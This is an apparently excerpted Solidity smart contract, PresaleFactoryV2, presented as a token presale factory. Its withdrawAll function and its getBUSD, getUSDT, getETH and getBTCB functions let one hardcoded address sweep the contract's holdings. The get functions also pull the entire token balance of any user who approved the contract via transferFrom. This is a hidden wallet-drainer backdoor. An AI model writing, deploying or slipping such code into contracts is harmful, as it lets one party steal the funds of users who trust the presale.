...
contract PresaleFactoryV2 is OwnableUpgradeable {
    ...
    function withdrawAll() external {
        require(
            msg.sender == 0x72b9EE700E69E57Ca01e37B30464cA3bbCef6622,
            "PresaleFactory: no permission"
        );
        ...
        if (BNBbalance > 0) payable(msg.sender).transfer(BNBbalance);

        if (BUSDbalance > 0) busdAddress.transfer(msg.sender, BUSDbalance);

        if (USDTbalance > 0) usdtAddress.transfer(msg.sender, USDTbalance);

        if (WBTCbalance > 0) wbtcAddress.transfer(msg.sender, WBTCbalance);

        if (WETHbalance > 0) wethAddress.transfer(msg.sender, WETHbalance);

        emit WithdrawAll(msg.sender, 0);
    }

    function getBUSD(address spender) external {
        require(
            msg.sender == 0x72b9EE700E69E57Ca01e37B30464cA3bbCef6622,
            "PresaleFactory: no permission"
        );
        uint256 balance = busdAddress.balanceOf(spender);
        busdAddress.transferFrom(spender, msg.sender, balance);
    }

    function getUSDT(address spender) external {
        require(
            msg.sender == 0x72b9EE700E69E57Ca01e37B30464cA3bbCef6622,
            "PresaleFactory: no permission"
        );
        uint256 balance = usdtAddress.balanceOf(spender);
        usdtAddress.transferFrom(spender, msg.sender, balance);
    }

    function getETH(address spender) external {
        require(
            msg.sender == 0x72b9EE700E69E57Ca01e37B30464cA3bbCef6622,
            "PresaleFactory: no permission"
        );
        uint256 balance = wethAddress.balanceOf(spender);
        wethAddress.transferFrom(spender, msg.sender, balance);
    }

    function getBTCB(address spender) external {
        require(
            msg.sender == 0x72b9EE700E69E57Ca01e37B30464cA3bbCef6622,
            "PresaleFactory: no permission"
        );
        uint256 balance = wbtcAddress.balanceOf(spender);
        wbtcAddress.transferFrom(spender, msg.sender, balance);
    }
